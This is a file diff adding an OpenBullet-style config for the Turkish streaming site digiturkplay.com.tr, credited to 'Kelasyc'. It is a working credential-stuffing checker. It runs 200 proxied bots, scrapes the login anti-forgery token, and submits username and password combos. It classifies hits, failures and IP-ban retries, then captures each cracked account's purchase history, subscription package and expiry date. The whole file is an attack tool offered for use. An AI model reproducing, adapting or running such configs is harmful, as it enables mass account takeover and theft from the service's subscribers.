@@ -1,0 +1,110 @@
+[SETTINGS]
+{
+  "Name": "digiturkplay.com.tr",
+  "SuggestedBots": 200,
+  "LastModified": "2019-05-14T11:00:01.4822438+03:00",
+  "AdditionalInfo": "",
+  "Author": "Kelasyc",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get_LOGİN REQUEST GET "https://www.digiturkplay.com.tr/uye-girisi" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,tr;q=0.8" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 190" 
+  HEADER "DNT: 1" 
+  HEADER "Host: www.digiturkplay.com.tr" 
+  HEADER "Origin: https://www.digiturkplay.com.tr" 
+  HEADER "Referer: https://www.digiturkplay.com.tr/uye-girisi" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
+
+#token PARSE "<SOURCE>" LR "\"><input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"" "\" />" -> VAR "token" "__RequestVerificationToken=" "&ReturnUrl=" 
+
+!#recaptcha RECAPTCHA "https://www.google.com/recaptcha/api2/payload?p=06AOLTBLSliRwBlzOcYAh2vPR_5x5Rv51BQ3JLNTtbnv2-2q81dHsutcWwPC3WO1RvWajQJ5WIfd4rTUv8mVf2-jvmExNU420wOZbeajgWVAgd1L9uDPh1k6gjGI98nXBF2lJYoY55eyO8nstKvYuqxNv9vI6trU6feziOjMAOu5VlU_5dnpKv_uM" "6LdyqQQTAAAAAAB6a3PUkTfgRQdFYd_wQ64bD3GA" -> VAR "recaptcha" 
+
+#Login_Post REQUEST POST "https://www.digiturkplay.com.tr/uye-girisi" 
+  CONTENT "<token>&ReturnUrl=&UserName=<USER>&Password=<PASS>&RememberMe=false&g-recaptcha-response=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,tr;q=0.8" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 190" 
+  HEADER "DNT: 1" 
+  HEADER "Host: www.digiturkplay.com.tr" 
+  HEADER "Origin: https://www.digiturkplay.com.tr" 
+  HEADER "Referer: https://www.digiturkplay.com.tr/uye-girisi" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "SERR2001 - Hatalı kullanıcı adı veya şifre." 
+  KEYCHAIN Success OR 
+    KEY "/profilim/uyelik-bilgileri" 
+  KEYCHAIN Retry OR 
+    KEY "Bu IP Ã¼zerinden iÅŸlem yapÄ±lamaz!" 
+    KEY "</div></div><span class='recaptcha-warning error'></span>" 
+    KEY "DigiturkPlay.com adresine yÃ¶nlendiriliyorsunuz." 
+
+#satin-alma-gecmisi REQUEST GET "https://www.digiturkplay.com.tr/profilim/satin-alma-gecmisi" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,tr;q=0.8" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "DNT: 1" 
+  HEADER "Host: www.digiturkplay.com.tr" 
+  HEADER "Referer: https://www.digiturkplay.com.tr/profilim/kiralananlar" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
+
+#satinalmagecmisiyok PARSE "<SOURCE>" LR "<p>Satın alma" ".</p>" -> CAP "satinalmagecmisi" 
+
+#satinalmagecmisivar PARSE "<SOURCE>" LR "<div class=\"billing-" "product-list col-xs-12\">" -> CAP "satinalmagecmisi" "kayıtvar => " "" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Satın alma kaydınız bulunmamaktadır." 
+
+#Paket REQUEST GET "https://www.digiturkplay.com.tr/profilim/paketler" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,tr;q=0.8" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "DNT: 1" 
+  HEADER "Host: www.digiturkplay.com.tr" 
+  HEADER "Referer: https://www.digiturkplay.com.tr/profilim/kiralananlar" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15" 
+
+#Paket PARSE "<SOURCE>" LR "aria-hidden=\"true\"></i>" "</h6>" -> CAP "PaketBilgisi" 
+
+#PaketVar PARSE "<SOURCE>" LR "Paket bitiş tarihi:" "</span>" -> CAP "Paket bitiş tarihi" "" " YOK" 
+
